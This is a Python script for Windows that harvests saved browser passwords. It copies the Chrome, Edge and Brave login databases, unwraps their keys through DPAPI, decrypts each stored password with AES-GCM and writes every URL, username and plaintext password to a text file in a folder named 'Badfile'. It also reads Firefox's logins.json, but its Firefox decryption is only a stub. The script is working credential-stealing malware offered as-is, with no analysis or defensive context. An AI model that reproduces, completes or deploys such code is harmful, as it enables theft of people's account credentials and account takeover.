import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

BROWSERS = {
    'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data'),
    'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
    'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data'),
    'Brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
    'Firefox': None  # Firefox profiles path will be determined dynamically
}

def get_encryption_key(browser_name):
    if browser_name in ['Chrome', 'Edge', 'Brave']:
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State') \
            if browser_name == 'Chrome' else os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State') \
            if browser_name == 'Edge' else os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')

        try:
            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state = json.loads(file.read())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decryption_key
        except Exception as e:
            return None
    return None

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt_and_verify(payload[:-16], payload[-16:])

def decrypt_password(ciphertext, encryption_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:]
        cipher = generate_cipher(encryption_key, iv)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return ""

def get_db_connection(browser_path_login_db):
    try:
        return sqlite3.connect(browser_path_login_db)
    except Exception as e:
        return None

def fetch_and_save_passwords(browser_name, db_path, encryption_key, file):
    if not os.path.exists(db_path):
        file.write(f"[ERROR] {browser_name} login database not found at {db_path}\n")
        return

    temp_db_path = f"{browser_name}_LoginData.db"
    shutil.copyfile(db_path, temp_db_path)
    
    conn = get_db_connection(temp_db_path)
    if encryption_key and conn:
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[1]
            ciphertext = login[2]
            
            if url or username or ciphertext:
                decrypted_password = decrypt_password(ciphertext, encryption_key) if ciphertext else "N/A"
                file.write(f"\n[{browser_name}] Sequence: {index}\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'='*80}\n")
            else:
                file.write(f"[WARN] Missing data for index {index}. URL: '{url}', Username: '{username}', Password: '{ciphertext}'\n")
        
        cursor.close()
        conn.close()
        os.remove(temp_db_path)
    else:
        file.write(f"[ERROR] Could not connect to the database or encryption key is invalid for {browser_name}\n")

def fetch_firefox_passwords(file):
    profiles_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(profiles_dir):
        file.write(f"[ERROR] Firefox profiles directory not found: {profiles_dir}\n")
        return

    for profile in os.listdir(profiles_dir):
        profile_path = os.path.join(profiles_dir, profile)
        if not os.path.isdir(profile_path):
            continue

        logins_path = os.path.join(profile_path, 'logins.json')
        if os.path.exists(logins_path):
            try:
                with open(logins_path, 'r', encoding='utf-8') as f:
                    logins_data = json.load(f)

                for login in logins_data.get('logins', []):
                    url = login.get('hostname', '')
                    username = login.get('encryptedUsername', '')
                    encrypted_password = login.get('encryptedPassword', '')

                    decrypted_password = decrypt_firefox_password(base64.b64decode(encrypted_password))
                    file.write(f"\n[Firefox] URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'='*80}\n")
            except Exception as e:
                file.write(f"[ERROR] Error reading Firefox logins file: {logins_path}\n")
                file.write(f"[ERROR] {str(e)}\n")

def decrypt_firefox_password(encrypted_password):
    # Placeholder for actual Firefox decryption logic
    # Currently returns the base64 decoded password as is
    return encrypted_password.decode(errors='ignore')

def main():
    file_path = r'C:\Users\user\Desktop\Badfile\passwords.txt'
    with open(file_path, 'w', encoding='utf-8') as file:
        for browser_name, db_path in BROWSERS.items():
            if browser_name != 'Firefox':
                encryption_key = get_encryption_key(browser_name)
                fetch_and_save_passwords(browser_name, db_path, encryption_key, file)
            else:
                fetch_firefox_passwords(file)

if __name__ == '__main__':
    main()
